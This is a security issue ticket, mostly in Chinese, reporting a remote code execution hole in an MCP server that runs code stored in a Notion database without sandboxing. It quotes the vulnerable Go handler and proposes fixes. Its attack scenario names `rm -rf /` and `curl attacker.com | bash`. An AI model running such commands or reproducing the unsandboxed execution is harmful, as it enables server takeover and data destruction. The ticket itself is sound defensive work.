---
status: pending
priority: p1
issue_id: "001"
tags: [security, critical, rce]
dependencies: []
---

## Problem Statement

**What is broken/missing and why it matters**

代码执行功能 (`createToolHandler`) 直接从 Notion 数据库获取代码并执行，没有任何沙箱或权限控制。任何可以编辑 Notion 数据库的人都可以在服务器上执行任意系统命令，存在严重的远程代码执行 (RCE) 风险。

## Findings

### 位置
- **文件**: `internal/server/server.go`
- **函数**: `createToolHandler` (第432-481行)

### 证据
```go
func (s *Server) createToolHandler(page notion.Page) mcp.ToolHandler {
    // 直接从Notion获取代码，无任何验证
    content, err := s.client.GetPageContent(context.Background(), page.ID)
    // ...
    codeStr := extractCodeString(content.Code.RichText)

    return func(ctx context.Context, request *mcp.CallToolRequest) (*mcp.CallToolResult, error) {
        // 直接执行获取的代码
        result, err := s.executor.Execute(ctx, language, codeStr, input)
```

### 攻击场景
攻击者可以在 Notion 数据库中写入恶意代码（如 `rm -rf /` 或 `curl attacker.com | bash`），然后通过 MCP 调用执行，控制整个服务器。

## Proposed Solutions

### Solution 1: 添加代码审查审批流程
**Pros:**
- 完全阻止未授权代码执行
- 可追溯谁批准了哪些代码

**Cons:**
- 增加运维复杂度
- 需要额外的审批UI/工作流

**Effort:** Large | **Risk:** Low

### Solution 2: 实现进程级沙箱
**Pros:**
- 隔离执行环境
- 限制文件系统/网络访问

**Cons:**
- 性能开销
- 配置复杂

**Effort:** Large | **Risk:** Medium

### Solution 3: 添加代码执行审计日志
**Pros:**
- 最小改动
- 可追溯

**Cons:**
- 不阻止攻击，只能事后审计

**Effort:** Small | **Risk:** High (仍存在RCE风险)

## Recommended Action

<!-- Filled during triage -->
[ ] 待定

## Acceptance Criteria

- [ ] 代码执行前需要某种形式的授权/审批
- [ ] 记录所有代码执行的审计日志
- [ ] 限制可执行的文件系统和网络访问

## Work Log

### 2026-02-14 - 代码审查发现

**By:** Claude Code

**Actions:**
- 执行安全审查，发现RCE漏洞

**Learnings:**
- 这是高危漏洞，需要优先修复
